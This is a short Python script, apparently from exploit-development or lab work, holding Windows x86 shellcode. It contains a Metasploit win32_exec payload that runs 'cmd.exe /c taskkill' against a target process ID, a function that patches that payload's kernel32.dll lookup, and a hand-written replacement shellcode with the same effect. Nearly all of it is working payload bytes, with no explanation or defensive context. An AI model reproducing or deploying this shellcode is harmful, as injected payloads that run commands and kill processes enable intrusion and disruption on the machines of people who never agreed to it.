#/* win32_exec -  EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA 
#Size=159 Encoder=None http://metasploit.com */
shellcode_original = \
    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \
    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" \
    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" \
    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" \
    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" \
    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09" \
    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" \
    "\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" \
    "\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b" \
    "\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41\x41\x41\x41\x00"

# ===============================

def modify_code(process_killer):
    # ----- make eax point to kernel32.dll
    ind=process_killer.find("\x85\xc0\x78\x0c")
    # ind =process_killer.rfind("\x85\xc0\x78\x0c")
    part1 = process_killer[:ind]

    part2 = "\x8b\x40\x0c\x8b\x70\x1c\xad\x89\xc6\xad\x8b\x68\x08" + 12 * "\x90"

    ind = process_killer.find("\x5f\x31\xf6")
    process_killer.rfind("\x5f\x31\xf6")
    part3 = process_killer[ind:]
    # hex(ord(part1[80-1]))

    return part1+part2+part3

shellcode_modified =modify_code(shellcode_original)

# ===============================


def print_shellcode(code):
    print(''.join([f"\\x{ord(k):02x}" for k in code]))
    print(''.join([f" {ord(k):02x}" for k in code]))


# ===============================


myshellcode = \
    "\xfc\x55\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b" \
    "\x45\x3c\x8b\x7c\x05\x78\x03\xfd\x8b\x4f\x18\x8b\x5f\x20\x03\xdd" \
    "\x49\x8b\x34\x8b\x03\xf5\x33\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca" \
    "\x0d\x03\xd0\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x03\xdd" \
    "\x66\x8b\x0c\x4b\x8b\x5f\x1c\x03\xdd\x03\x2c\x8b\x89\x6c\x24\x1c" \
    "\x61\xc3\x33\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b" \
    "\xf0\xad\x8b\x40\x08\x5e\x68\x98\xfe\x8a\x0e\x50\xff\xd6\x53\x8b" \
    "\xd6\x83\xc2\x72\x52\xff\xd0\x83\xc4\x0c\x5d\xc3" \
    +\
    "cmd.exe /c taskkill /PID AAAA" + "\x00"

# print(shellcode)
# ===========================
shellcode = shellcode_modified
shellcode = myshellcode
# ===========================


